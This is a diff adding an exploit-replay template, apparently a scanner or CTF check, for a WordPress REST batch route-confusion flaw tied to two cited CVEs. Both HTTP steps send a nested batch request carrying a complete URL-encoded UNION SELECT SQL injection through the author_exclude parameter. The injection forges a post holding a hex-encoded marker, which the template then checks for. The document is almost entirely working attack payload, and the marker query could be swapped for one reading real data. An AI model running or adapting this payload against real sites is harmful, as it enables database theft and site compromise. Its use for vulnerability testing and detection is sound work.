@@ -1,0 +1,14 @@
+id: wp/batch-route-confusion-sqli-rce
+summary: wp2shell (CVE-2026-63030 + CVE-2026-60137) live target replay: nested REST batch route confusion reaches the WP_Query author__not_in sink with a UNION fake-post row.
+ref: CVE-2026-63030
+ref: CVE-2026-60137
+
+http inject-union
+  # the desynced inner batch dispatches the item-route request under posts get_items(); author_exclude reaches WP_Query author__not_in unsanitized and the UNION forges a fake post carrying the marker
+  post "/?rest_route=/batch/v1" as a raw json with {"requests": [{"method": "POST", "path": "///"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "POST", "path": "///"}, {"method": "GET", "path": "/wp/v2/posts/999999?author_exclude=1%29+AND+1%3D0+UNION+SELECT+999999%2C2%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C5%2CCONCAT%280x7c7c%2CHEX%28CAST%28%28SELECT+%27WPCTF%7Blive_batch_sqli%7D%27%29AS+CHAR%29%29%2C0x7c7c%29%2C7%2C0x7075626c697368%2C9%2C10%2C11%2C12%2C13%2C14%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C17%2C18%2C19%2C20%2C0x706f7374%2C22%2C23--+-&orderby=none&per_page=500"}, {"method": "GET", "path": "/wp/v2/posts"}]}}, {"method": "POST", "path": "/batch/v1", "body": {"requests": []}}]}
+  expect the response to match "\|\|[0-9A-F]{20,}\|\|"
+
+http verify-marker
+  # the reflected title contains the exact hex of WPCTF{live_batch_sqli}, proving the injected SELECT executed
+  post "/?rest_route=/batch/v1" as a raw json with {"requests": [{"method": "POST", "path": "///"}, {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [{"method": "POST", "path": "///"}, {"method": "GET", "path": "/wp/v2/posts/999999?author_exclude=1%29+AND+1%3D0+UNION+SELECT+999999%2C2%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C5%2CCONCAT%280x7c7c%2CHEX%28CAST%28%28SELECT+%27WPCTF%7Blive_batch_sqli%7D%27%29AS+CHAR%29%29%2C0x7c7c%29%2C7%2C0x7075626c697368%2C9%2C10%2C11%2C12%2C13%2C14%2C0x323032302d30312d30312030303a30303a3030%2C0x323032302d30312d30312030303a30303a3030%2C17%2C18%2C19%2C20%2C0x706f7374%2C22%2C23--+-&orderby=none&per_page=500"}, {"method": "GET", "path": "/wp/v2/posts"}]}}, {"method": "POST", "path": "/batch/v1", "body": {"requests": []}}]}
+  expect "57504354467B6C6976655F62617463685F73716C697D" in the response
